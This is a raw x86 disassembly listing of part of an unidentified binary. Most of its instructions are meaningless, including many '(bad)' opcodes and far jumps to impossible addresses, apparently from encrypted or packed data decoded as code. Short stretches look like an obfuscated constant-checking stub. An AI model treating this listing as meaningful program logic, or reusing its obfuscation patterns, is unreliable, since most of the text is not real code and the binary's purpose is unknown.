  4071b7:	xchg   edi,eax
  4071b8:	mov    edi,0xef0a9d64
  4071bd:	outs   dx,BYTE PTR ds:[esi]
  4071be:	xor    eax,edi
  4071c0:	(bad)  
  4071c1:	mov    BYTE PTR [esi],ch
  4071c3:	push   ds
  4071c4:	(bad)  
  4071c5:	sbb    dl,BYTE PTR [esi+edi*1-0x36]
  4071c9:	sahf   
  4071ca:	sub    DWORD PTR [edi+0x413cf2a0],esp
  4071d0:	(bad)  
  4071d2:	retf   
  4071d3:	sub    BYTE PTR [edi+0x9],ch
  4071d6:	fsubr  st(5),st
  4071d8:	ss adc al,0x40
  4071db:	adc    dh,al
  4071dd:	push   esi
  4071de:	into   
  4071df:	fdiv   QWORD PTR [esi]
  4071e1:	jmp    0x34171c69
  4071e6:	cdq    
  4071e7:	imul   eax,DWORD PTR [eax+0x47f72888],0x3963d9e0
  4071f1:	sub    al,0x34
  4071f3:	scas   al,BYTE PTR es:[edi]
  4071f4:	sti    
  4071f5:	(bad)  
  4071f6:	jg     0x4071db
  4071f8:	push   ebp
  4071f9:	(bad)
  4071fd:	pop    esp
  4071fe:	lds    ecx,FWORD PTR [ebx]
  407200:	adc    eax,0x8cb51de6
  407205:	mov    ah,0x71
  407207:	cmp    al,0x71
  407209:	dec    ebp
  40720a:	or     eax,0xc0379dad
  40720f:	inc    esp
  407210:	(bad)
  407213:	jno    0x4071e5
  407215:	and    eax,0xefc513ed
  40721a:	pop    eax
  40721b:	sti    
  40721c:	fucomip st,st(6)
  40721e:	push   ds
  40721f:	inc    edi
  407220:	jmp    0x1746:0x48eb7c55
  407227:	inc    edx
  407228:	data16 mov ch,0xe9
  40722b:	fcomp  QWORD PTR [ebp+0x17b049]
  407231:	jnp    0x407224
  407233:	test   eax,0xac5d713f
  407238:	inc    ecx
  407239:	nop
  40723a:	stos   DWORD PTR es:[edi],eax
  40723b:	add    al,0x51
  40723d:	loope  0x4071fc
  40723f:	fsubr  QWORD PTR ds:[edi-0x4fcfd74d]
  407246:	(bad)  
  407247:	pop    edx
  407248:	pop    es
  407249:	pop    eax
  40724a:	leave  
  40724b:	mov    DWORD PTR [ebp-0x2c],0x4f39
  407252:	mov    DWORD PTR ds:0x4344ef,0x15ae
  40725c:	cmp    eax,DWORD PTR [edx]
  40725e:	mov    DWORD PTR ds:0x4344df,0x344d
  407268:	je     0x40836f
  40726e:	mov    DWORD PTR [ebp-0xc],0x705fd8c
  407275:	lea    eax,[ebp-0xc]
  407278:	add    DWORD PTR ds:0x434613,0x4344e3
  407282:	mov    DWORD PTR [ebp-0x10],eax
  407285:	xor    eax,DWORD PTR ds:0x434507
  40728b:	mov    eax,DWORD PTR [ebp-0x10]
  40728e:	not    edx
  407290:	mov    edx,DWORD PTR [eax]
  407292:	or     DWORD PTR ds:0x4344fb,0x7c2e
  40729c:	imul   edx,edx,0xf89ea9ed
  4072a2:	mov    DWORD PTR ds:0x43454b,0x5d50
  4072ac:	mov    DWORD PTR [eax],edx
  4072ae:	mov    DWORD PTR ds:0x43453b,0x7ba0
  4072b8:	mov    eax,DWORD PTR [ebp-0xc]
  4072bb:	cmp    eax,0x9155269c
  4072c0:	je     0x4076db
  4072c6:	mov    edi,DWORD PTR ds:0x4345ef
  4072cc:	mov    eax,ds:0x434633
  4072d1:	sub    eax,edi
  4072d3:	sub    edi,DWORD PTR [edi+eax*1]
  4072d6:	mov    eax,DWORD PTR [ebp-0x1c]
  4072d9:	or     DWORD PTR [eax],0x60751c9d
  4072df:	mov    eax,DWORD PTR [ebp-0x8]
  4072e2:	xor    eax,ecx
  4072e4:	add    eax,esi
  4072e6:	pop    edi
  4072e7:	pop    esi
  4072e8:	jmp    0x4076d6
  4072ed:	pop    ds
  4072ee:	add    al,0x2a
  4072f0:	or     eax,0x2c313d35
  4072f5:	add    eax,0x16907a48
  4072fa:	loop   0x407325
  4072fc:	mov    ch,0x3f
  4072fe:	iret   
  4072ff:	jle    0x40737f
  407301:	dec    edi
  407302:	jns    0x407382
  407304:	jle    0x407350
  407306:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407307:	out    0xb,al
  407309:	test   DWORD PTR ds:0xbf9cda0,esp
  40730f:	dec    esp
  407310:	loopne 0x407300
  407312:	sahf   
  407313:	fwait
  407314:	shr    BYTE PTR [edx+0x638c4be8],cl
  40731a:	call   0x5456c891
  40731f:	push   esp
  407320:	aas    
  407321:	cwde   
  407322:	mov    eax,0x5086ccaa
  407327:	pop    cx
  407329:	xchg   edi,eax
  40732a:	jns    0x4072e5
  40732c:	mov    dh,0x8e
  40732e:	test   eax,0xb1347742
  407333:	adc    eax,DWORD PTR [edi]
  407335:	(bad)  
  407336:	pop    ebx
  407337:	jp     0x407322
  407339:	sub    al,0xa7
  40733b:	and    esp,ebx
  40733d:	rcr    ch,cl
  40733f:	mov    eax,0xa20966d5
  407344:	cwde   
  407345:	(bad)  
  407346:	loop   0x4073bb
  407348:	mov    eax,ds:0xfb74ee36
  40734d:	adc    DWORD PTR [ebp-0x63],eax
  407350:	and    DWORD PTR [edi-0x2d],eax
  407353:	cmp    BYTE PTR [edx+0x48],bl
  407356:	cmp    dh,BYTE PTR [ebp-0x31]
  407359:	sahf   
  40735a:	(bad)  
  40735b:	ins    DWORD PTR es:[edi],dx
  40735c:	ins    DWORD PTR es:[edi],dx
  40735d:	cmp    DWORD PTR [edi-0x66abd1fd],esp
  407363:	test   eax,ebx
  407365:	std    
  407366:	cmc    
  407367:	daa    
  407368:	cmp    eax,0xe9fb4a4
  40736d:	jae    0x407390
  40736f:	xchg   edi,eax
  407370:	scas   eax,DWORD PTR es:[edi]
  407371:	int    0xbc
  407373:	jp     0x407343
  407375:	cmp    ebx,ebp
  407377:	jnp    0x40735e
  407379:	aad    0x37
  40737b:	mov    ch,0x58
  40737d:	retf   
  40737e:	ret    
  40737f:	add    cl,BYTE PTR [ebx]
  407381:	sbb    cl,BYTE PTR [edx]
  407383:	imul   edx,DWORD PTR [eax-0x7e],0xffffffab
  407387:	xor    al,0x2c
  407389:	and    ah,cl
  40738b:	push   ss
  40738c:	call   0xdc7de8fe
  407391:	mov    ah,0x88
  407393:	mov    cl,0xc3
  407395:	ror    BYTE PTR [ebx+0x2a09fade],1
  40739b:	xchg   BYTE PTR [edx-0x1f6c7126],ch
  4073a1:	ror    DWORD PTR [esi],1
  4073a3:	pusha  
  4073a4:	pop    ecx
  4073a5:	fmul   QWORD PTR [ebx-0x7625d253]
  4073ab:	fmul   QWORD PTR [eax+0x10]
  4073ae:	xchg   edi,eax
  4073af:	(bad)  
  4073b0:	ins    BYTE PTR es:[edi],dx
  4073b1:	push   cs
  4073b2:	mov    DWORD PTR [ecx+0x42],0xb631b449
  4073b9:	in     al,dx
  4073ba:	int    0xa3
  4073bc:	iret   
  4073bd:	imul   esp,DWORD PTR [ebx+0x4c],0xcebb7b98
  4073c4:	and    BYTE PTR [ecx],cl
  4073c6:	(bad)  
  4073c7:	ja     0x407426
  4073c9:	std    
  4073ca:	mov    edi,0x83b6244
  4073cf:	jg     0x40736f
  4073d1:	dec    ecx
  4073d2:	add    DWORD PTR [edx-0x2082910b],ebp
  4073d8:	in     al,0xe6
  4073da:	mov    ss,WORD PTR [eax]
  4073dc:	sub    eax,0x5b3889d
  4073e1:	dec    esp
  4073e2:	and    al,0x4d
  4073e4:	repnz fwait
  4073e6:	or     DWORD PTR [edx],ebp
  4073e8:	xchg   ebp,eax
  4073e9:	xor    eax,0x72180111
  4073ee:	fistp  DWORD PTR [edi]
  4073f0:	mov    esi,0xdeeb0ae9
  4073f5:	dec    esp
  4073f6:	add    al,0xdb
  4073f8:	(bad)  
  4073f9:	or     eax,0xf590db75
  4073fe:	mov    al,0x43
  407400:	lea    ebx,gs:[eax-0x33f72051]
  407407:	(bad)  
  407408:	in     al,dx
  407409:	mov    ah,ch
  40740b:	mov    WORD PTR [edi+0x3f72167],gs
  407411:	shl    ecx,cl
  407413:	(bad)  
  407414:	fisubr WORD PTR [edi-0x773e983d]
  40741a:	fsubp  st(4),st
  40741c:	pop    edx
  40741d:	into   
  40741e:	adc    BYTE PTR [ebp-0x25],bl
  407421:	stc    
  407422:	arpl   WORD PTR [edi-0x5791cc1d],si
  407428:	mov    bl,0x3b
  40742a:	jno    0x40749c
  40742c:	pop    ecx
  40742d:	cmp    esi,DWORD PTR [ecx+esi*4]
  407430:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407431:	inc    eax
  407432:	xchg   BYTE PTR [ebp-0x27f27153],cl
  407438:	ins    BYTE PTR es:[edi],dx
  407439:	mov    edi,0x72a9a751
  40743e:	fdivr  st(5),st
  407440:	pop    ebx
  407441:	cld    
  407442:	add    al,al
  407444:	inc    ebp
  407445:	mov    ds:0xb9ba2f9,al
  40744a:	sbb    esi,DWORD PTR [edi]
  40744c:	jne    0x407416
  40744e:	ins    BYTE PTR es:[edi],dx
  40744f:	mov    esp,0x9f4832c9
  407454:	outs   dx,DWORD PTR ds:[esi]
  407455:	stc    
  407456:	aas    
  407457:	push   esi
  407458:	add    BYTE PTR [edi-0x3],ch
  40745b:	stos   BYTE PTR es:[edi],al
  40745c:	sti    
  40745d:	dec    esp
  40745e:	cmp    cl,ah
  407460:	xor    BYTE PTR [ebx+0x7f37ce4],dh
  407466:	push   eax
  407467:	adc    DWORD PTR [ebp-0x49],esi
  40746a:	out    dx,eax
  40746b:	cmp    al,0xe7
  40746d:	out    0xc2,al
  40746f:	arpl   WORD PTR [ecx+0x5527f3ce],ax
  407475:	sbb    ecx,DWORD PTR [ebx]
  407477:	fist   WORD PTR [ebx+esi*1]
  40747a:	lods   al,BYTE PTR ds:[esi]
  40747b:	push   esp
  40747c:	lods   eax,DWORD PTR ds:[esi]
  40747d:	mov    DWORD PTR [ebp-0x63c3471c],edx
  407483:	xor    al,0xdb
  407485:	mov    ?,WORD PTR [eax]
  407487:	aaa    
  407488:	inc    ecx
  407489:	mov    al,ds:0xd07fc59
  40748e:	aad    0x97
  407490:	into   
  407491:	cld    
  407492:	arpl   WORD PTR [eax-0x4f],si
  407495:	mov    eax,ds:0x5db8a7a8
  40749a:	iret   
  40749b:	xchg   ebx,eax
  40749c:	aas    
  40749d:	fs into 
  40749f:	popa   
  4074a0:	aad    0x81
  4074a2:	mov    bh,0x97
  4074a4:	or     al,0x5
  4074a6:	xor    eax,0x16800eec
  4074ab:	pop    ebx
  4074ac:	mov    ah,0x73
  4074ae:	pop    edx
  4074af:	aad    0x1b
  4074b1:	cli    
  4074b2:	xlat   BYTE PTR ds:[ebx]
  4074b3:	aas    
  4074b4:	jge    0x4074da
  4074b6:	mov    ds:0xb3d1f88,al
  4074bb:	cmc    
  4074bc:	jo     0x407496
  4074be:	sbb    eax,0xbcbebca8
  4074c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074c4:	dec    esp
  4074c5:	push   ds
  4074c6:	out    0xba,al
  4074c8:	retf   0xf7e7
  4074cb:	enter  0x6668,0x59
  4074cf:	fs aaa 
  4074d1:	lods   al,BYTE PTR ds:[esi]
  4074d2:	sub    eax,0x1040fa8d
  4074d7:	adc    ebp,DWORD PTR [esi+0xf]
  4074da:	jmp    0xa909:0x1da39183
  4074e1:	add    esi,DWORD PTR [esi]
  4074e3:	fsub   QWORD PTR [esi-0x36]
  4074e6:	outs   dx,DWORD PTR ds:[esi]
  4074e7:	push   ebp
  4074e8:	sbb    al,0x82
  4074ea:	inc    esp
  4074eb:	test   al,0x5
  4074ed:	mov    ds:0x3dea2dd0,al
  4074f2:	push   0x13
  4074f4:	inc    eax
  4074f5:	sub    esi,ebx
  4074f7:	rcr    DWORD PTR [ecx+0x5f],0x59
  4074fb:	je     0x4074c9
  4074fd:	aad    0xf3
  4074ff:	add    ebx,DWORD PTR [esp-0x51]
  407503:	jo     0x40751d
  407505:	xor    eax,0x603e9bf6
  40750a:	std    
  40750b:	mov    esp,0x6e5b1ceb
  407510:	xchg   ebx,eax
  407511:	adc    edx,DWORD PTR [edi]
  407513:	sub    DWORD PTR [edx-0x2d3c5caa],esp
  407519:	add    DWORD PTR [ebp+eiz*8-0x37cedf6f],edx
  407520:	push   edi
  407521:	and    BYTE PTR [esi],bh
  407523:	in     al,0x56
  407525:	inc    edi
  407526:	jns    0x4074be
  407528:	inc    edi
  407529:	xchg   eax,edx
  40752b:	bound  esp,QWORD PTR [ebp-0x69]
  40752e:	push   edi
  40752f:	arpl   bp,bx
  407531:	cmp    ebp,edi
  407533:	pop    ecx
  407534:	push   0xa0e5a8a3
  407539:	aam    0x1c
  40753b:	enter  0x3695,0xbf
  40753f:	or     ch,ah
  407541:	mov    ah,BYTE PTR ds:0xa8ab3041
  407547:	and    DWORD PTR [edx+0x5c],esi
  40754a:	shr    DWORD PTR ds:0xe30b4d4d,cl
  407550:	add    DWORD PTR [esi],esi
  407552:	pusha  
  407553:	popa   
  407554:	or     BYTE PTR [eax-0x2],cl
  407557:	jg     0x407569
  407559:	out    dx,eax
  40755a:	mov    bh,0xc6
  40755c:	(bad)  
  40755d:	sub    esi,DWORD PTR ds:0x8829766c
  407563:	pop    ebx
  407564:	jmp    0x407511
  407566:	pop    edi
  407567:	rcl    ecx,0xd
  40756a:	or     al,0x38
  40756c:	pusha  
  40756d:	out    dx,eax
  40756e:	ror    bh,0x1e
  407571:	mov    eax,ebp
  407573:	jne    0x407573
  407575:	jns    0x40750c
  407577:	dec    esp
  407578:	push   ds
  407579:	pushf  
  40757a:	jmp    0x965afaa1
  40757f:	inc    esi
  407580:	sbb    ah,BYTE PTR [eax]
  407582:	shl    al,1
  407584:	sbb    ch,BYTE PTR [esi+0x77]
  407587:	xchg   ebp,eax
  407588:	ficom  DWORD PTR [edx]
  40758a:	jns    0x407554
  40758c:	std    
  40758d:	shl    esp,1
  40758f:	cmc    
  407590:	jmp    0x40760a
  407592:	loop   0x40760a
  407594:	pop    es
  407595:	mov    BYTE PTR [ebp+0x2e],0x99
  407599:	outs   dx,DWORD PTR ds:[esi]
  40759a:	mov    ch,BYTE PTR [edx+0x37191a91]
  4075a0:	int3   
  4075a1:	sub    bh,BYTE PTR [esi+0xdb3d30f]
  4075a7:	mov    edx,0xb93e0601
  4075ac:	(bad)  
  4075ad:	imul   ebx,eax,0x305d2c8
  4075b3:	loope  0x407565
  4075b5:	dec    ecx
  4075b6:	sti    
  4075b7:	mov    cl,0xe7
  4075b9:	ss mov ch,0x21
  4075bc:	lods   al,BYTE PTR ds:[esi]
  4075bd:	stos   DWORD PTR es:[edi],eax
  4075be:	fldenv [edi]
  4075c0:	and    al,BYTE PTR [ebx]
  4075c2:	jge    0x40759f
  4075c4:	fild   QWORD PTR [eax-0x62d0f22]
  4075ca:	out    0x4e,eax
  4075cc:	fisub  WORD PTR [ecx+0x32]
  4075cf:	dec    esp
  4075d0:	mov    cl,0xa3
  4075d2:	pushf  
  4075d3:	sub    DWORD PTR [edi-0x7],ecx
  4075d6:	inc    esp
  4075d7:	jne    0x4075ba
  4075d9:	and    eax,0xf4df669b
  4075de:	dec    eax
  4075df:	addr16 cmc 
  4075e1:	ret    0x7384
  4075e4:	sti    
  4075e5:	dec    eax
  4075e6:	xchg   edx,eax
  4075e7:	adc    bh,dl
  4075e9:	and    BYTE PTR [edx-0x2af67726],0x67
  4075f0:	xor    al,0x3f
  4075f2:	in     al,0x4b
  4075f4:	cmp    eax,eax
  4075f6:	add    esi,DWORD PTR [ebx]
  4075f8:	cwde   
  4075f9:	inc    ebx
  4075fa:	dec    ebp
  4075fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075fc:	inc    ebp
  4075fd:	or     BYTE PTR [eax+0x4f971eff],ah
  407603:	or     DWORD PTR [esi],edx
  407605:	(bad)  
  407606:	pusha  
  407607:	call   0x56fc:0x833321dc
  40760e:	push   edx
  40760f:	push   esi
  407610:	pop    ebp
  407611:	xlat   BYTE PTR ds:[ebx]
  407612:	pop    ebx
  407613:	(bad)  
  407614:	retf   0xacc9
  407617:	mov    ds:0xebac2bfc,eax
  40761c:	or     DWORD PTR [eax-0x48],0xc52f6e81
  407623:	aas    
  407624:	jmp    0x24cea6f0
  407629:	addr16 push ecx
  40762b:	adc    dh,cl
  40762d:	jecxz  0x407690
  40762f:	pop    es
  407630:	into   
  407631:	jmp    0x5e1d:0xea7c5bd0
  407638:	adc    edi,DWORD PTR [ebx-0xcbba9d2]
  40763e:	sub    cl,bl
  407640:	out    dx,eax
  407641:	jmp    0xb6eecfd3
  407646:	or     esp,edi
  407648:	cmp    eax,0x54390c3a
  40764d:	shr    BYTE PTR [edx-0x11],1
  407650:	int    0xee
  407652:	sub    BYTE PTR [eax],bh
  407654:	cdq    
  407655:	out    0x74,al
  407657:	bound  edx,QWORD PTR [edx]
  407659:	and    DWORD PTR [edi+edx*2+0x17],esp
  40765d:	jmp    0xa479:0xb0232537
  407664:	inc    eax
  407665:	mov    ds:0x24fc585f,al
  40766a:	and    ch,BYTE PTR [edi+eiz*1+0x7b4d0a36]
  407671:	and    dh,bl
  407673:	ja     0x4076f0
  407675:	pop    esi
  407676:	mov    dh,0xfc
  407678:	outs   dx,BYTE PTR ds:[esi]
  407679:	push   eax
  40767a:	cmp    eax,0x298eaaab
  40767f:	scas   al,BYTE PTR es:[edi]
  407680:	push   esi
  407681:	mov    bh,0xce
  407683:	aaa    
  407684:	dec    esp
  407685:	ret    
  407686:	or     eax,0x8e1ba77a
  40768b:	sub    DWORD PTR [ebp-0x9],0x1241cde0
  407692:	sub    eax,edx
  407694:	sub    al,0xf
  407696:	pop    eax
  407697:	jmp    0xef04:0xb860a0f6
  40769e:	cmp    DWORD PTR [eax],0xfffffff9
  4076a1:	and    BYTE PTR [edx+ebp*2-0xc],bh
  4076a5:	jl     0x40770d
  4076a7:	ds fs cmps DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4076ab:	mov    ds:0xbea42ddf,eax
  4076b0:	xchg   esp,eax
  4076b1:	int3   
  4076b2:	inc    ecx
  4076b3:	and    BYTE PTR [eax-0x43b40180],ah
  4076b9:	mov    ebx,0x975ce59d
  4076be:	or     al,0x44
  4076c0:	je     0x4076f3
  4076c2:	dec    ebx
  4076c3:	sbb    eax,0xf3e000b5
  4076c8:	inc    ebp
  4076c9:	adc    eax,DWORD PTR [eax]
  4076cb:	scas   al,BYTE PTR es:[edi]
  4076cc:	sbb    al,0x63
  4076ce:	jmp    DWORD PTR [esi+0x73]
  4076d1:	cdq    
  4076d2:	push   cs
  4076d3:	xor    al,0x5
  4076d5:	fcomp  QWORD PTR [ebx-0x37]
  4076d8:	ret    0x4
  4076db:	mov    eax,DWORD PTR [ebp-0xc]
  4076de:	add    eax,DWORD PTR [ebp-0x18]
  4076e1:	cmp    eax,0x89f4544a
  4076e6:	je     0x4076fa
  4076ec:	mov    eax,DWORD PTR [ebp-0x10]
  4076ef:	and    DWORD PTR [eax],0x751c9e
  4076f5:	jmp    0x4072df
  4076fa:	mov    eax,DWORD PTR [ebp-0xc]
  4076fd:	mov    edx,DWORD PTR [ebp-0x18]
  407700:	or     eax,edx
  407702:	cmp    eax,0xf9df2fbe
  407707:	je     0x407b09
  40770d:	jmp    0x407afb
  407712:	ret    
  407713:	or     esi,DWORD PTR [ebx+eiz*1+0x7c]
  407717:	ins    DWORD PTR es:[edi],dx
  407718:	pop    ebp
  407719:	jmp    0x407762
  40771b:	(bad)  
  40771c:	pop    ecx
  40771d:	sbb    eax,0x900f0118
  407722:	or     bl,cl
  407724:	jle    0x4077a4
  407726:	dec    edi
  407727:	jns    0x4077a7
  407729:	jle    0x40773f
  40772b:	cmp    DWORD PTR [ebp-0x7f0e017c],ebx
  407731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407732:	scas   eax,DWORD PTR es:[edi]
  407733:	adc    esi,DWORD PTR [ebp+0x2e]
  407736:	inc    edx
  407737:	mov    al,ah
  407739:	pop    ss
  40773a:	mov    ebx,0x39e2ff
  40773f:	push   edx
  407740:	adc    al,0xcf
  407742:	cmp    eax,DWORD PTR [esi]
  407744:	(bad)  
  407747:	push   cs
  407748:	xchg   ecx,eax
  407749:	popf   
  40774a:	inc    esi
  40774b:	mov    ds:0xe4fb1360,eax
  407750:	jmp    0x9d6a3be4
  407755:	loop   0x40774c
  407757:	cmp    DWORD PTR [ebp-0x113b37ad],ebp
  40775d:	mov    esp,0xdc06385a
  407762:	mov    esi,0x31f3e51
  407767:	mov    ds:0x672e49d2,eax
  40776c:	xor    ebx,DWORD PTR [edx-0xc081fff]
  407772:	test   DWORD PTR ds:0x3c232596,edx
  407778:	les    ebp,FWORD PTR [edx-0x5d]
  40777b:	and    DWORD PTR [ebp-0x4c],ecx
  40777e:	and    BYTE PTR [edx+ebp*2+0xbd573f9],ah
  407785:	pop    edi
  407786:	mov    al,0xa0
  407788:	retf   0x72c9
  40778b:	test   esi,ecx
  40778d:	out    dx,eax
  40778e:	clc    
  40778f:	xor    ah,BYTE PTR [ecx-0x574c8a48]
  407795:	pop    ss
  407796:	mov    eax,ds:0x9a6e7b73
  40779b:	mov    WORD PTR [esi-0x2e0c5744],cs
  4077a1:	cmp    BYTE PTR [esi+ebp*4],cl
  4077a4:	mov    DWORD PTR [edi],ebp
  4077a6:	mov    dh,0xd3
  4077a8:	pushf  
  4077a9:	jnp    0x40778c
  4077ab:	sahf   
  4077ac:	jbe    0x4077e6
  4077ae:	inc    ebp
  4077af:	aam    0xe1
  4077b1:	fisttp WORD PTR [edi-0x76e33157]
  4077b7:	mov    ecx,0x4d780170
  4077bc:	xchg   ecx,eax
  4077bd:	dec    ebx
  4077be:	pop    es
  4077bf:	add    bl,dh
  4077c1:	adc    eax,0x276b37a3
  4077c6:	mov    eax,ds:0x96ee8c8b
  4077cb:	(bad)  
  4077cc:	shr    bl,cl
  4077ce:	pop    es
  4077cf:	es mov al,0xad
  4077d2:	lea    esi,[ecx-0x34]
  4077d5:	mov    eax,ds:0x1c6f77ba
  4077da:	data16 jecxz 0x407773
  4077dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077df:	in     eax,0x71
  4077e1:	pop    edi
  4077e2:	sbb    bl,BYTE PTR [ebx+0x3c34ccde]
  4077e8:	pop    ds
  4077e9:	xor    BYTE PTR ds:0x17692877,al
  4077ef:	aad    0xe9
  4077f1:	gs jb  0x4077ad
  4077f4:	div    BYTE PTR [eax+0xc]
  4077f7:	in     eax,dx
  4077f8:	jo     0x40782d
  4077fa:	ror    cl,1
  4077fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077fd:	sub    DWORD PTR [eax+0x62dcc6b1],esi
  407803:	jle    0x4077fe
  407805:	inc    edi
  407806:	lahf   
  407807:	xor    eax,0xa7c911d9
  40780c:	cmp    BYTE PTR [edi+eax*4+0x1bcc498a],dl
  407813:	pusha  
  407814:	test   edi,ecx
  407816:	loopne 0x407860
  407818:	lock ja 0x4077e4
  40781b:	cmp    al,0x7d
  40781d:	cmp    BYTE PTR [ecx+0x62e12a72],dh
  407823:	popf   
  407824:	adc    ebx,DWORD PTR [ebx+ebp*2]
  407827:	or     al,0xef
  407829:	sbb    DWORD PTR [eax-0x18],ebp
  40782c:	or     esi,DWORD PTR [edx-0x72]
  40782f:	ret    0x5674
  407832:	inc    ebx
  407833:	lds    eax,FWORD PTR [ebp-0x2b40f6dc]
  407839:	push   ebp
  40783a:	and    edi,DWORD PTR [esi-0x75]
  40783d:	enter  0x9cb4,0x44
  407841:	mov    edi,0x8da8c8a7
  407846:	lods   eax,DWORD PTR ds:[esi]
  407847:	adc    ah,ah
  407849:	pop    ebx
  40784a:	push   0x3a628611
  40784f:	stos   DWORD PTR es:[edi],eax
  407850:	lods   al,BYTE PTR ds:[esi]
  407851:	xlat   BYTE PTR ds:[ebx]
  407852:	push   cs
  407853:	out    0xbd,al
  407855:	std    
  407856:	jl     0x407822
  407858:	jl     0x407801
  40785a:	lods   al,BYTE PTR ds:[esi]
  40785b:	mov    esi,0x5965815b
  407860:	jns    0x4078ce
  407862:	das    
  407863:	dec    edx
  407864:	xchg   edi,eax
  407865:	test   eax,0x889fc0bd
  40786a:	stos   BYTE PTR es:[edi],al
  40786b:	imul   esi,esi,0xffffffcc
  40786e:	(bad)  
  40786f:	(bad)  
  407870:	mov    ch,0xd3
  407872:	inc    ecx
  407873:	jge    0x40781e
  407875:	xor    BYTE PTR [ebx],bh
  407877:	(bad)  [edi]
  407879:	aam    0x50
  40787b:	lods   al,BYTE PTR ds:[esi]
  40787c:	fnsave [ecx-0x72e8b833]
  407882:	out    0x43,al
  407884:	xlat   BYTE PTR ds:[ebx]
  407885:	mov    bh,0xae
  407887:	in     eax,dx
  407888:	nop
  407889:	inc    edx
  40788a:	into   
  40788b:	adc    DWORD PTR [eax-0x73],eax
  40788e:	sbb    DWORD PTR [edi-0x7a],ebx
  407891:	dec    edi
  407892:	gs std 
  407894:	mov    edx,0xfafc223d
  407899:	push   cs
  40789a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40789b:	sbb    BYTE PTR [edi-0x46d3b5f3],0x86
  4078a2:	daa    
  4078a3:	in     eax,0x33
  4078a5:	inc    ebp
  4078a6:	push   0xffffffff
  4078a8:	fwait
  4078a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078aa:	cld    
  4078ab:	mov    es,WORD PTR [esi+0x3bdffda6]
  4078b1:	pop    esi
  4078b2:	fsub   QWORD PTR [edx-0x64]
  4078b5:	sbb    edi,edi
  4078b7:	idiv   BYTE PTR [ecx]
  4078b9:	sub    DWORD PTR [edx],0x2d2e2860
  4078bf:	shl    DWORD PTR [ebp-0x1e],cl
  4078c2:	inc    cl
  4078c4:	outs   dx,BYTE PTR ds:[esi]
  4078c5:	mov    esp,0x5fbef17
  4078ca:	aaa    
  4078cb:	adc    al,bh
  4078cd:	cs xchg ebx,eax
  4078cf:	pop    ebx
  4078d0:	out    0x1,eax
  4078d2:	jno    0x4078e5
  4078d4:	ins    DWORD PTR es:[edi],dx
  4078d5:	inc    esi
  4078d6:	push   ebp
  4078d7:	inc    eax
  4078d8:	sbb    DWORD PTR [esi-0x8e56451],edi
  4078de:	adc    bl,dh
  4078e0:	(bad)  
  4078e1:	mov    ebx,0xd1a1b625
  4078e6:	cmp    dh,BYTE PTR [ebp+eax*4+0x6a8a0bae]
  4078ed:	dec    edi
  4078ee:	and    eax,0xf0737d8d
  4078f3:	and    eax,0xb65dbf26
  4078f8:	rcl    BYTE PTR [ecx+0x9a3cdfe],0x1c
  4078ff:	xchg   ebx,eax
  407900:	lahf   
  407901:	or     BYTE PTR [esi],al
  407903:	push   ebp
  407904:	ss test eax,0x7ab71b1
  40790a:	mov    al,0x53
  40790c:	sub    al,0xc1
  40790e:	or     DWORD PTR [ebx+0x654617ce],edi
  407914:	push   ebp
  407915:	retf   0x9310
  407918:	dec    esp
  407919:	mov    ds,ebp
  40791b:	jg     0x4078b5
  40791d:	mov    cs,WORD PTR fs:[ebx+0x6f]
  407921:	fidivr DWORD PTR ds:0xf4637718
  407927:	xor    DWORD PTR [ecx-0x6b],esp
  40792a:	int3   
  40792b:	aam    0x4d
  40792d:	inc    ecx
  40792e:	out    dx,eax
  40792f:	lahf   
  407930:	loope  0x40794f
  407932:	rcr    BYTE PTR [bp+di],cl
  407935:	repnz mov ebx,0x9c8ec193
  40793b:	cmc    
  40793c:	fs aas 
  40793e:	std    
  40793f:	hlt    
  407940:	jmp    0x13ea:0xa53ee925
  407947:	mov    eax,0x81f37f6c
  40794c:	xchg   edi,eax
  40794d:	mov    bl,dl
  40794f:	sub    eax,0x9fbd0cf9
  407954:	mov    bh,0xb0
  407956:	pushf  
  407957:	adc    al,0x4b
  407959:	jnp    0x4078f1
  40795b:	jo     0x407982
  40795d:	call   0xc35f208e
  407962:	lods   eax,DWORD PTR ds:[esi]
  407963:	fcmovu st,st(5)
  407965:	xor    ch,bl
  407967:	sbb    dh,cl
  407969:	int    0xef
  40796b:	stc    
  40796c:	stos   BYTE PTR es:[edi],al
  40796d:	test   eax,0xfbe8ec7e
  407972:	cwde   
  407973:	sub    DWORD PTR [ecx-0x1ef61df4],edi
  407979:	fstp   DWORD PTR [eax]
  40797b:	mov    bh,dh
  40797d:	push   es
  40797e:	adc    DWORD PTR [edx+0x6bb73d04],ebp
  407984:	jns    0x40793d
  407986:	xor    al,0xc3
  407988:	loopne 0x4079bd
  40798a:	scas   eax,DWORD PTR es:[edi]
  40798b:	inc    ecx
  40798c:	mov    edx,0x47383355
  407991:	sbb    dh,BYTE PTR [esi-0x67]
  407994:	dec    esp
  407995:	or     dh,al
  407997:	fld    TBYTE PTR [esi+0x2e]
  40799a:	jle    0x4079a1
  40799c:	std    
  40799d:	sub    cl,bl
  40799f:	aad    0xfc
  4079a1:	fimul  DWORD PTR [ecx]
  4079a3:	(bad)  
  4079a4:	fld    QWORD PTR [ebx+0x7]
  4079a7:	outs   dx,BYTE PTR ds:[esi]
  4079a8:	ror    edi,1
  4079aa:	pop    ebx
  4079ab:	push   ds
  4079ac:	mov    al,ds:0x4a058538
  4079b1:	(bad)  
  4079b2:	call   0x468d:0xa418c855
  4079b9:	rcr    eax,cl
  4079bb:	les    eax,FWORD PTR [esi]
  4079bd:	pop    ebx
  4079be:	sub    DWORD PTR [ecx-0xaf1902e],edi
  4079c4:	inc    esp
  4079c5:	add    BYTE PTR [ebx],dh
  4079c7:	push   es
  4079c8:	pop    ds
  4079c9:	xor    al,ah
  4079cb:	inc    ebx
  4079cc:	jb     0x407a0c
  4079ce:	and    eax,0x1ac5492
  4079d3:	outs   dx,BYTE PTR ds:[esi]
